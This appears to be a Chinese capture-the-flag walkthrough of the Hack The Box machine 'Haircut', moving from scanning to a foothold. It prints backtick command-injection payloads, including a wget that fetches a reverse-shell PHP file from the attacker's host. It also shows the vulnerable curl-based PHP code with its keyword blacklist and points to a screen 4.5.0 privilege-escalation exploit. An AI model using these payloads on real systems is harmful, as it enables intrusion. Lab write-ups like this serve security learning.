
# 探测

开放端口
```
┌──(root㉿ss)-[~/htb/Haircut]
└─# nmap -p- --open --min-rate=1000 10.10.10.24 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 04:12 EDT
Nmap scan report for 10.10.10.24
Host is up (0.0056s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.99 seconds

```

# 详细信息
```
┌──(root㉿ss)-[~/htb/Haircut]
└─# nmap -sV -Pn -A -O 10.10.10.24 -p 22,80          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-30 04:13 EDT
Nmap scan report for 10.10.10.24
Host is up (0.0090s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
|_http-server-header: nginx/1.10.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT     ADDRESS
1   7.76 ms 10.10.16.1
2   3.67 ms 10.10.10.24

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.90 seconds

```

# web

目录爆破
```
┌──(root㉿ss)-[~/htb/Haircut]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.10.10.24 -t 100

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.24/_22-05-30_04-17-25.txt

Error Log: /root/dirsearch/logs/errors-22-05-30_04-17-25.log

Target: http://10.10.10.24/

[04:17:25] Starting: 
[04:17:25] 400 -  182B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[04:18:51] 400 -  182B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[04:19:27] 200 -  144B  - /index.html                                       
[04:20:57] 200 -  223B  - /test.html                                        
[04:21:11] 301 -  194B  - /uploads  ->  http://10.10.10.24/uploads/         
[04:21:11] 403 -  580B  - /uploads/   
```

静态文件，没有太有价值的东西

## 爆破扩展名

主机是linux机器，运行着nginx，那么我们可以假定靶机运行了php程序

```
┌──(root㉿ss)-[~/htb/Haircut]
└─# gobuster dir -t 100  --no-error --url http://10.10.10.24 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -x ph
p,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.24
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
2022/05/30 04:50:37 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 194] [--> http://10.10.10.24/uploads/]
/exposed.php          (Status: 200) [Size: 446]                                  
                                                                                 
===============================================================
2022/05/30 04:56:34 Finished
===============================================================

```

爆破出来一个exposed.php文件


url打开这个文件，页面要求输入一个url地址，我们首先怀疑存在RFI

本地python开启一个web服务器，exposed.php访问
```
http://10.10.16.4/any
```

本地显示：
```
┌──(root💀kali)-[~/htb/Haircut]
└─# python3 -m http.server 80            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.24 - - [30/May/2022 04:53:34] code 404, message File not found
10.10.10.24 - - [30/May/2022 04:53:34] "GET /any HTTP/1.1" 404 -

```

证明可以访问我们本地的文件

但是使用php文件会直接显示代码不会被解释成php代码执行

我们看执行的信息
```
 % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed

  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
 48  5488   48  2686    0     0   1867      0  0:00:02  0:00:01  0:00:01  1866
```

这里像是用curl命令把url里的文件下载到了本地

比如我们本地kali执行
```
┌──(root💀kali)-[~/htb/Haircut]
└─# curl -v http://10.10.10.24/bounce.jpg --output bounce.jpg                                                  23 ⨯
*   Trying 10.10.10.24:80...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 10.10.10.24 (10.10.10.24) port 80 (#0)
> GET /bounce.jpg HTTP/1.1
> Host: 10.10.10.24
> User-Agent: curl/7.83.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Server: nginx/1.10.0 (Ubuntu)
< Date: Mon, 30 May 2022 09:14:48 GMT
< Content-Type: image/jpeg
< Content-Length: 116637
< Last-Modified: Mon, 15 May 2017 08:58:51 GMT
< Connection: keep-alive
< ETag: "59196dcb-1c79d"
< Accept-Ranges: bytes
< 
{ [3776 bytes data]
100  113k  100  113k    0     0   6776      0  0:00:17  0:00:17 --:--:--  6095
* Connection #0 to host 10.10.10.24 left intact

```

我们假设靶机会把我们输入的url当做命令交给curl执行，那么可以考虑命令注入

注入的位置为：
```
curl -v [这里是输入的url地址] [这里是注入命令的地方] --output bounce.jpg
```


经过测试，使用反引号可以注入我们的命令
```
http://localhost/test.html`ping -c 4 10.10.16.4`
```


kali开启tcpdump可以监听到靶机传过来的ICMP包
```
┌──(root💀kali)-[~/htb/Haircut]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
05:20:54.878346 IP 10.10.10.24 > 10.10.16.4: ICMP echo request, id 4072, seq 1, length 64
05:20:54.878372 IP 10.10.16.4 > 10.10.10.24: ICMP echo reply, id 4072, seq 1, length 64
05:20:55.175226 IP 10.10.10.24 > 10.10.16.4: ICMP echo request, id 4072, seq 2, length 64
05:20:55.175254 IP 10.10.16.4 > 10.10.10.24: ICMP echo reply, id 4072, seq 2, length 64
05:20:56.594721 IP 10.10.10.24 > 10.10.16.4: ICMP echo request, id 4072, seq 3, length 64
05:20:56.594746 IP 10.10.16.4 > 10.10.10.24: ICMP echo reply, id 4072, seq 3, length 64
05:20:57.593064 IP 10.10.10.24 > 10.10.16.4: ICMP echo request, id 4072, seq 4, length 64
05:20:57.593092 IP 10.10.16.4 > 10.10.10.24: ICMP echo reply, id 4072, seq 4, length 64

```

因为注入有很多过滤，我们使用下面命令把rev.php下载到uploads文件夹

```
http://localhost/test.html`wget http://10.10.16.4/rev.php -O ./uploads/rev.php`
```

访问下面url触发
```
http://10.10.10.24/uploads/rev.php
```

拿到foothold
```
┌──(root💀kali)-[~/htb/Haircut]
└─# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.24] 32900
Linux haircut 4.4.0-78-generic #99-Ubuntu SMP Thu Apr 27 15:29:09 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 11:53:38 up  1:42,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data

```


拿到user.txt
```
www-data@haircut:/home/maria$ ls
ls
Desktop    Downloads  Pictures  Templates  user.txt
Documents  Music      Public    Videos
www-data@haircut:/home/maria$ cat user.txt
cat user.txt
f5e0270d5d9d0295...

```


# 提权

找到一个mysql连接密码
```
www-data@haircut:/home/maria/.tasks$ cat task1
cat task1
#!/usr/bin/php
<?php
$mysql_id = mysql_connect('127.0.0.1', 'root', 'passIsNotThis');
mysql_select_db('taskmanager', $mysql_id);


?>
www-data@haircut:/home/maria/.tasks$ 

```


exposed.php
看见有一个黑名单过滤
```
www-data@haircut:~/html$ cat exposed.php
cat exposed.php
<html>
        <head>
                <title>Hairdresser checker</title>
        </head>
        <body>
        <form action='exposed.php' method='POST'>
                <span>
                <p>
                Enter the Hairdresser's location you would like to check. Example: http://localhost/test.html
                </p>
                </span>
                <input type='text' name='formurl' id='formurl' width='50' value='http://localhost/test.html'/>
                <input type='submit' name='submit' value='Go' id='submit' />
        </form>
        <span>
                <?php 
                        if(isset($_POST['formurl'])){
                        echo "<p>Requesting Site...</p>"; 
                        $userurl=$_POST['formurl'];
                        $naughtyurl=0;
                        $disallowed=array('%','!','|',';','python','nc','perl','bash','&','#','{','}','[',']');
                        foreach($disallowed as $naughty){
                                if(strpos($userurl,$naughty) !==false){
                                        echo $naughty.' is not a good thing to put in a URL';
                                        $naughtyurl=1;
                                }
                        }
                        if($naughtyurl==0){
                                echo shell_exec("curl ".$userurl." 2>&1"); 
                        }
                        }
                ?>
        </span>
        </body>
</html>


```


查看SUID
```
www-data@haircut:/tmp$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/bin/ntfs-3g
/bin/ping6
/bin/fusermount
/bin/su
/bin/mount
/bin/ping
/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0
/usr/bin/chsh
/usr/bin/chfn
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1

```


screen-4.5.0貌似可以拿来提权，见[这里](https://www.exploit-db.com/exploits/41154)

